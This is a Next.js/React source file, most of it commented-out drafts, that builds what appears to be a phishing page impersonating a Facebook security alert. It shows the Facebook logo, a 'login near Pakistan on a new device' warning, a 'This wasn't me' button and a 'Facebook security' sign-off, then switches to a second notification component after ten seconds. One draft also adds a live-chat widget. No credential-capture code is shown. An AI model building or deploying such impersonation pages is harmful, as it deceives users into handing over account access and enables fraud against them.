// 'use client'
// import { useState, useEffect } from 'react';
// import Head from 'next/head';
// import FullscreenNotificationTemplate from './components/AnothorDeviceLogin';
// import { FacebookNotification } from './components/notification';

// export default function Home() {
//   const [showAlert, setShowAlert] = useState(false);

//   useEffect(() => {
//     // Show alert after 3 seconds
//     const alertTimer = setTimeout(() => {
//       setShowAlert(true);
//     }, 10000);
    
//     // Clean up timer
//     return () => {
//       clearTimeout(alertTimer);
//     };
//   }, []);

//   return (
//     <div className="min-h-screen bg-gray-100">
//       <Head>
//         <title>Important Alert</title>
//         <meta name="viewport" content="width=device-width, initial-scale=1" />
//       </Head>

//       {/* Display FacebookNotification initially, then switch to AlertNotification after 3 seconds */}
//       <div className="flex justify-center items-center min-h-screen p-2 md:p-0">
//         {showAlert ? <FacebookNotification/> :  <FullscreenNotificationTemplate/>}
//       </div>
//     </div>
//   );
// }





















// // // // // // // // import { Button } from "@/components/ui/button"
// // // // // // // // // import { FacebookNotification } from "./components/notification"
// // // // // // // // import FinalMessage from "./components/finalMessage"

// // // // // // // // export default function Home() {
// // // // // // // //   return (
// // // // // // // //     <div>
// // // // // // // //       {/* <FacebookNotification/> */}
// // // // // // // //       <FinalMessage/>
// // // // // // // //     </div>
// // // // // // // //   )
// // // // // // // // }


// // // // // // // // pages/index.js
// // // // // // // 'use client'
// // // // // // // import { useState, useEffect } from 'react';
// // // // // // // import Head from 'next/head';
// // // // // // // import AlertNotification from './components/AlertNotification';
// // // // // // // import { FacebookNotification } from './components/notification';
// // // // // // // import TawkToChat from './TawkToChat';

// // // // // // // export default function Home() {
// // // // // // //   const [showAlert, setShowAlert] = useState(false);

// // // // // // //   useEffect(() => {
// // // // // // //     // Show alert after 3 seconds
// // // // // // //     const alertTimer = setTimeout(() => {
// // // // // // //       setShowAlert(true);
// // // // // // //     }, 10000);
    
// // // // // // //     // Clean up timer
// // // // // // //     return () => {
// // // // // // //       clearTimeout(alertTimer);
// // // // // // //     };
// // // // // // //   }, []);

// // // // // // //   return (
// // // // // // //     <div className="min-h-screen bg-gray-100">
// // // // // // //       <Head>
// // // // // // //         <title>Important Alert</title>
// // // // // // //         <meta name="viewport" content="width=device-width, initial-scale=1" />
// // // // // // //       </Head>
// // // // // // //       <TawkToChat/>

// // // // // // //       {/* Display FacebookNotification initially, then switch to AlertNotification after 3 seconds */}
// // // // // // //       <div className="flex justify-center items-center min-h-screen p-2 md:p-0">
// // // // // // //         {showAlert ? <AlertNotification /> : <FacebookNotification />}
// // // // // // //       </div>
// // // // // // //     </div>
// // // // // // //   );
// // // // // // // }


// // // // // // import React from 'react';

// // // // // // const NotificationTemplate = () => {
// // // // // //   return (
// // // // // //     <div className="font-sans max-w-xl mx-auto bg-gray-50 text-gray-800">
// // // // // //       {/* Header */}
// // // // // //       <div className="px-4 py-3 flex justify-between items-center border-b border-gray-200 bg-white">
// // // // // //         <div className="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center text-white font-bold text-xl">
// // // // // //           L
// // // // // //         </div>
// // // // // //         <div className="flex items-center gap-2">
// // // // // //           <span className="font-medium">Alex Johnson</span>
// // // // // //           <div className="w-8 h-8 rounded-full bg-gray-200"></div>
// // // // // //         </div>
// // // // // //       </div>
      
// // // // // //       {/* Content */}
// // // // // //       <div className="p-4 bg-white">
// // // // // //         <h1 className="text-xl md:text-2xl font-semibold mb-4">
// // // // // //           Learning Portal: new course available in your area
// // // // // //         </h1>
        
// // // // // //         <p className="mb-4">Hi Alex,</p>
        
// // // // // //         <p className="mb-4">
// // // // // //           A new course has been added to your Learning Portal subscription near San Francisco. 
// // // // // //           Check out this exciting opportunity to expand your skills!
// // // // // //         </p>
        
// // // // // //         <p className="font-medium mb-2">Course Details:</p>
        
// // // // // //         {/* Notification Box */}
// // // // // //         <div className="border-4 border-green-400 rounded-lg p-3 mb-4">
// // // // // //           {/* Map Container */}
// // // // // //           <div className="bg-teal-900 h-48 rounded-lg mb-4 flex items-center justify-center text-white text-2xl">
// // // // // //             San Francisco
// // // // // //           </div>
          
// // // // // //           {/* Info Rows */}
// // // // // //           <div className="flex items-center gap-3 mb-3">
// // // // // //             <div className="w-6 flex justify-center">📍</div>
// // // // // //             <div>San Francisco, CA</div>
// // // // // //           </div>
          
// // // // // //           <div className="flex items-center gap-3 mb-3">
// // // // // //             <div className="w-6 flex justify-center">💻</div>
// // // // // //             <div>Web Development Fundamentals</div>
// // // // // //           </div>
          
// // // // // //           <div className="flex items-center gap-3">
// // // // // //             <div className="w-6 flex justify-center">🕒</div>
// // // // // //             <div>Monday 15 April 2025 at 18:30</div>
// // // // // //           </div>
// // // // // //         </div>
        
// // // // // //         {/* Button */}
// // // // // //         <button className="w-full bg-blue-600 text-white py-3 rounded-md font-medium mb-4">
// // // // // //           View Course Details
// // // // // //         </button>
        
// // // // // //         <p className="mb-4">
// // // // // //           If you're not interested in this course, you can ignore this notification.
// // // // // //         </p>
        
// // // // // //         <p className="mb-4">
// // // // // //           Want to verify this notification? Visit the Help Center at:{' '}
// // // // // //           <a href="#" className="text-blue-600">www.learningportal.com/help/verify</a>
// // // // // //         </p>
        
// // // // // //         <p className="mb-4">
// // // // // //           To customize your notification preferences, visit your account settings. 
// // // // // //           We'll continue to notify you about new courses and learning opportunities in your area.
// // // // // //         </p>
        
// // // // // //         <p className="mb-4">
// // // // // //           Thanks,<br />Learning Portal Team
// // // // // //         </p>
// // // // // //       </div>
      
// // // // // //       {/* Footer */}
// // // // // //       <div className="p-4 text-sm text-gray-500">
// // // // // //         <p>This is an automated notification. Please do not reply to this email.</p>
// // // // // //       </div>
// // // // // //     </div>
// // // // // //   );
// // // // // // };

// // // // // // export default NotificationTemplate;


// // // // // import React from 'react';

// // // // // const CenteredNotificationTemplate = () => {
// // // // //   return (
// // // // //     <div className="min-h-screen w-full flex items-center justify-center bg-gray-100 p-4">
// // // // //       <div className="w-full max-w-md bg-white shadow-lg rounded-lg overflow-hidden">
// // // // //         {/* Header */}
// // // // //         <div className="px-4 py-3 flex justify-between items-center border-b border-gray-200">
// // // // //           <div className="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center text-white font-bold text-xl">
// // // // //             L
// // // // //           </div>
// // // // //           <div className="flex items-center gap-2">
// // // // //             <span className="font-medium">Alex Johnson</span>
// // // // //             <div className="w-8 h-8 rounded-full bg-gray-200"></div>
// // // // //           </div>
// // // // //         </div>
        
// // // // //         {/* Content */}
// // // // //         <div className="p-4">
// // // // //           <h1 className="text-xl font-semibold mb-3">
// // // // //             Learning Portal: new course available
// // // // //           </h1>
          
// // // // //           <p className="mb-2">Hi Alex,</p>
          
// // // // //           <p className="mb-3 text-sm">
// // // // //             A new course has been added to your Learning Portal subscription near San Francisco.
// // // // //           </p>
          
// // // // //           {/* Notification Box */}
// // // // //           <div className="border-3 border-green-400 rounded-lg p-3 mb-3">
// // // // //             {/* Map Container */}
// // // // //             <div className="bg-teal-900 h-32 rounded-lg mb-3 flex items-center justify-center text-white text-xl">
// // // // //               San Francisco
// // // // //             </div>
            
// // // // //             {/* Info Rows */}
// // // // //             <div className="flex items-center gap-2 mb-2 text-sm">
// // // // //               <div className="w-5 flex justify-center">📍</div>
// // // // //               <div>San Francisco, CA</div>
// // // // //             </div>
            
// // // // //             <div className="flex items-center gap-2 mb-2 text-sm">
// // // // //               <div className="w-5 flex justify-center">💻</div>
// // // // //               <div>Web Development Course</div>
// // // // //             </div>
            
// // // // //             <div className="flex items-center gap-2 text-sm">
// // // // //               <div className="w-5 flex justify-center">🕒</div>
// // // // //               <div>April 15, 2025 at 18:30</div>
// // // // //             </div>
// // // // //           </div>
          
// // // // //           {/* Button */}
// // // // //           <button className="w-full bg-blue-600 text-white py-2 rounded-md font-medium mb-3">
// // // // //             View Course Details
// // // // //           </button>
          
// // // // //           <p className="mb-2 text-sm">
// // // // //             If not interested, ignore this notification.
// // // // //           </p>
          
// // // // //           <div className="text-center mt-2">
// // // // //             <a href="#" className="text-blue-600 text-sm">www.learningportal.com/verify</a>
// // // // //           </div>
// // // // //         </div>
        
// // // // //         {/* Footer */}
// // // // //         <div className="px-4 py-3 text-sm text-gray-500 border-t border-gray-200 text-center">
// // // // //           Learning Portal Team
// // // // //         </div>
// // // // //       </div>
// // // // //     </div>
// // // // //   );
// // // // // };

// // // // // export default CenteredNotificationTemplate;




// // // // 'use client'

// // // // import React from 'react';

// // // // const FullscreenNotificationTemplate = () => {
// // // //   return (
// // // //     <div className="min-h-screen w-full flex items-center justify-center bg-gray-100">
// // // //       <div className="w-full h-screen max-h-screen flex flex-col bg-white overflow-hidden sm:px-4 md:px-6 lg:px-8">
// // // //         {/* Header - smaller fixed height */}
// // // //         <div className="px-3 py-2 flex justify-between items-center border-b border-gray-200 h-14 md:h-16">
// // // //           <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-blue-600 flex items-center justify-center text-white font-bold text-lg">
// // // //             L
// // // //           </div>
          
// // // //         </div>
        
// // // //         {/* Content - takes remaining space */}
// // // //         <div className="p-3 sm:p-4 flex flex-col flex-grow overflow-hidden">
// // // //           <h1 className="text-lg sm:text-xl md:text-2xl font-semibold mb-2">
// // // //           Security alert: login near Pakistan on a new device
// // // //           </h1>
          
// // // //           <div className="flex flex-col md:flex-row gap-3 flex-grow overflow-hidden">
// // // //             {/* Left side */}
// // // //             <div className="flex flex-col md:w-1/2 md:pr-2">
// // // //               <p className="mb-1 text-sm sm:text-base">Hi Alex,</p>
              
// // // //               <p className="mb-2 text-xs sm:text-sm">
// // // //                 A new course has been added to your Learning Portal subscription in Pakistan.
// // // //                 Check out this exciting opportunity to expand your skills!
// // // //               </p>
              
// // // //               {/* Button */}
// // // //               <button className="w-full bg-blue-600 text-white py-2 rounded-md 
// // // //                               font-medium text-sm sm:text-base mt-1 mb-2">
// // // //                 View Course Details
// // // //               </button>
              
// // // //               <p className="mb-1 text-xs">
// // // //                 If you're not interested in this course, you can ignore this notification.
// // // //               </p>
              
// // // //               <div className="mt-auto">
// // // //                 <a href="#" className="text-blue-600 text-xs sm:text-sm">
// // // //                   www.learningportal.com/verify
// // // //                 </a>
// // // //               </div>
// // // //             </div>
            
// // // //             {/* Right side - notification box */}
// // // //             <div className="border border-gray-300 rounded-lg p-2 sm:p-3 md:w-1/2 flex flex-col h-64 sm:h-auto">
// // // //               {/* Map Image - responsive and contained */}
// // // //               <div className="bg-teal-900 rounded-md mb-2 flex-grow flex items-center justify-center overflow-hidden">
// // // //                 <img 
// // // //                   src="/api/placeholder/400/250" 
// // // //                   alt="Map of Pakistan" 
// // // //                   className="w-full h-full object-cover object-center"
// // // //                 />
// // // //               </div>
              
// // // //               {/* Info Rows - more compact */}
// // // //               <div className="flex items-center gap-1 mb-1 text-xs sm:text-sm">
// // // //                 <div className="w-4 flex justify-center">📍</div>
// // // //                 <div>PAKISTAN</div>
// // // //               </div>
              
// // // //               <div className="flex items-center gap-1 mb-1 text-xs sm:text-sm">
// // // //                 <div className="w-4 flex justify-center">💻</div>
// // // //                 <div>Chrome on Windows</div>
// // // //               </div>
              
// // // //               <div className="flex items-center gap-1 text-xs sm:text-sm">
// // // //                 <div className="w-4 flex justify-center">🕒</div>
// // // //                 <div>April 11, 2025</div>
// // // //               </div>
// // // //             </div>
// // // //           </div>
// // // //         </div>
// // // //       </div>
// // // //     </div>
// // // //   );
// // // // };

// // // // export default FullscreenNotificationTemplate;



// // // import React from 'react';

// // // const FullscreenNotificationTemplate = () => {
// // //   return (
// // //     <div className="min-h-screen w-full flex items-center justify-center bg-gray-100">
// // //       <div className="w-full max-w-7xl mx-auto min-h-screen flex flex-col bg-white overflow-hidden px-4 sm:px-6 md:px-8 lg:px-12">
// // //         {/* Header - adaptive height and padding */}
// // //         <div className="py-3 md:py-4 flex justify-between items-center border-b border-gray-200">
// // //           <img 
// // //             src='/facebook-logo-facebook-icon-transparent-free-png.webp' 
// // //             alt='Facebook' 
// // //             className='w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 object-contain'
// // //           />
// // //         </div>
        
// // //         {/* Content - flexible height with proper spacing */}
// // //         <div className="flex-grow py-4 sm:py-6 md:py-8">
// // //           <h1 className="text-xl sm:text-2xl md:text-3xl font-semibold mb-4 md:mb-6">
// // //             Security alert: login near Pakistan on a new device
// // //           </h1>
          
// // //           <div className="flex flex-col lg:flex-row gap-6 md:gap-8">
// // //             {/* Left side - message content */}
// // //             <div className="flex-1 flex flex-col">
// // //               <div className="space-y-4">
// // //                 <p className="text-base sm:text-lg">Hi,</p>
                
// // //                 <p className="text-sm sm:text-base text-gray-700">
// // //                   Someone just logged in to your Facebook account near PAKISTAN, PAKISTAN on Chrome. 
// // //                   If this wasn't you, we're here to help you take some simple steps to secure your account.
// // //                 </p>
                
// // //                 <button className="w-full sm:w-auto px-6 bg-blue-600 hover:bg-blue-700 
// // //                                  text-white py-3 rounded-lg font-medium text-base sm:text-lg 
// // //                                  transition-colors duration-200">
// // //                   This wasn't me
// // //                 </button>
                
// // //                 <div className="space-y-3 text-sm sm:text-base text-gray-700 mt-6">
// // //                   <p>
// // //                     If this was you, you can ignore this notification.
// // //                   </p>
                  
// // //                   <p>
// // //                     Wondering if this notification is really from us? Visit the help Center to confirm:
// // //                     <br />
// // //                     <a href="facebook-support" className="text-blue-600 hover:text-blue-700 hover:underline">
// // //                       www.facebook.com/help/verify
// // //                     </a>
// // //                   </p>
                  
// // //                   <p>
// // //                     To improve your account security, we've enabled login alerts. 
// // //                     We'll continue to notify you whenever your username and password 
// // //                     are used to log in from a new browser or device.
// // //                   </p>
                  
// // //                   <p>
// // //                     Thanks,
// // //                     <br />
// // //                     Facebook security
// // //                   </p>
// // //                 </div>
// // //               </div>
// // //             </div>
            
// // //             {/* Right side - notification box */}
// // //             <div className="lg:w-[400px] border border-gray-300 rounded-xl p-4 sm:p-5">
// // //               <div className="bg-teal-900 rounded-lg overflow-hidden aspect-video mb-4">
// // //                 <img 
// // //                   src="/pakimage.webp" 
// // //                   alt="Map of Pakistan" 
// // //                   className="w-full h-full object-cover"
// // //                 />
// // //               </div>
              
// // //               <div className="space-y-3">
// // //                 <div className="flex items-center gap-3">
// // //                   <span className="w-5 flex justify-center">📍</span>
// // //                   <span className="text-sm sm:text-base">PAKISTAN</span>
// // //                 </div>
                
// // //                 <div className="flex items-center gap-3">
// // //                   <span className="w-5 flex justify-center">💻</span>
// // //                   <span className="text-sm sm:text-base">Chrome on Windows</span>
// // //                 </div>
                
// // //                 <div className="flex items-center gap-3">
// // //                   <span className="w-5 flex justify-center">🕒</span>
// // //                   <span className="text-sm sm:text-base">April 11, 2025</span>
// // //                 </div>
// // //               </div>
// // //             </div>
// // //           </div>
// // //         </div>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // export default FullscreenNotificationTemplate;



// // "use client"
// // import React from 'react';

// // const FullscreenNotificationTemplate = () => {
// //   return (
// //     <div className="min-h-screen w-full flex items-center justify-center bg-gray-100">
// //       <div className="w-full max-w-7xl mx-auto h-screen flex flex-col bg-white overflow-hidden px-3 sm:px-6 md:px-8 lg:px-12">
// //         {/* Header - reduced padding and size on mobile */}
// //         <div className="py-2 md:py-4 flex justify-between items-center border-b border-gray-200">
// //           <img 
// //             src='/facebook.svg' 
// //             alt='Facebook' 
// //             className='w-12 h-12 sm:w-20 sm:h-20 md:w-24 md:h-24 object-contain'
// //           />
// //         </div>
        
// //         {/* Content - optimized spacing for mobile */}
// //         <div className="flex-1 py-2 sm:py-6 md:py-8 overflow-y-auto">
// //           <h1 className="text-lg sm:text-2xl md:text-3xl font-semibold mb-2 md:mb-6">
// //             Security alert: login near Pakistan on a new device
// //           </h1>
          
// //           <div className="flex flex-col lg:flex-row gap-3 md:gap-8">
// //             {/* Left side - message content */}
// //             <div className="flex-1 flex flex-col">
// //               <div className="space-y-2 sm:space-y-4">
// //                 <p className="text-sm sm:text-lg">Hi,</p>
                
// //                 <p className="text-xs sm:text-base text-gray-700">
// //                   Someone just logged in to your Facebook account near PAKISTAN, PAKISTAN on Chrome. 
// //                   If this wasn't you, we're here to help you take some simple steps to secure your account.
// //                 </p>
                
// //                 <button className="w-full sm:w-auto px-4 sm:px-6 bg-blue-600 hover:bg-blue-700 
// //                                  text-white py-2 sm:py-3 rounded-lg font-medium text-sm sm:text-lg 
// //                                  transition-colors duration-200">
// //                   This wasn't me
// //                 </button>
                
// //                 <div className="space-y-2 sm:space-y-3 text-xs sm:text-base text-gray-700 mt-2 sm:mt-6">
// //                   <p>
// //                     If this was you, you can ignore this notification.
// //                   </p>
                  
// //                   <p>
// //                     Wondering if this notification is really from us? Visit the help Center to confirm:
// //                     <br />
// //                     <a href="facebook-support" className="text-blue-600 hover:text-blue-700 hover:underline">
// //                       www.facebook.com/help/verify
// //                     </a>
// //                   </p>
                  
// //                   <p>
// //                     To improve your account security, we've enabled login alerts. 
// //                     We'll continue to notify you whenever your username and password 
// //                     are used to log in from a new browser or device.
// //                   </p>
                  
// //                   <p>
// //                     Thanks,
// //                     <br />
// //                     Facebook security
// //                   </p>
// //                 </div>
// //               </div>
// //             </div>
            
// //             {/* Right side - notification box */}
// //             <div className="lg:w-[400px] border border-gray-300 rounded-xl p-3 sm:p-5">
// //               <div className="bg-teal-900 rounded-lg overflow-hidden h-32 sm:h-auto sm:aspect-video mb-2 sm:mb-4">
// //                 <img 
// //                   src="/pakimage.webp" 
// //                   alt="Map of Pakistan" 
// //                   className="w-full h-full object-cover"
// //                 />
// //               </div>
              
// //               <div className="space-y-1 sm:space-y-3">
// //                 <div className="flex items-center gap-2 sm:gap-3">
// //                   <span className="w-4 sm:w-5 flex justify-center">📍</span>
// //                   <span className="text-xs sm:text-base">PAKISTAN</span>
// //                 </div>
                
// //                 <div className="flex items-center gap-2 sm:gap-3">
// //                   <span className="w-4 sm:w-5 flex justify-center">💻</span>
// //                   <span className="text-xs sm:text-base">Chrome on Windows</span>
// //                 </div>
                
// //                 <div className="flex items-center gap-2 sm:gap-3">
// //                   <span className="w-4 sm:w-5 flex justify-center">🕒</span>
// //                   <span className="text-xs sm:text-base">April 11, 2025</span>
// //                 </div>
// //               </div>
// //             </div>
// //           </div>
// //         </div>
// //       </div>
// //     </div>
// //   );
// // };

// // export default FullscreenNotificationTemplate;



'use client';
import { useState, useEffect } from 'react';
import Head from 'next/head';
import FullscreenNotificationTemplate from './components/AnothorDeviceLogin';
import { FacebookNotification } from './components/notification';

export default function Home() {
  const [showAlert, setShowAlert] = useState(false);

  useEffect(() => {
    const alertTimer = setTimeout(() => {
      setShowAlert(true);
    }, 10000);

    return () => clearTimeout(alertTimer);
  }, []);

  return (
    <div className="min-h-screen bg-gray-100">
      <Head>
        <title>Important Alert</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div className="flex justify-center items-center min-h-screen p-2 md:p-0">
        {showAlert ? (
          <FacebookNotification />
        ) : (
          <FullscreenNotificationTemplate triggerAlert={() => setShowAlert(true)} />
        )}
      </div>
    </div>
  );
}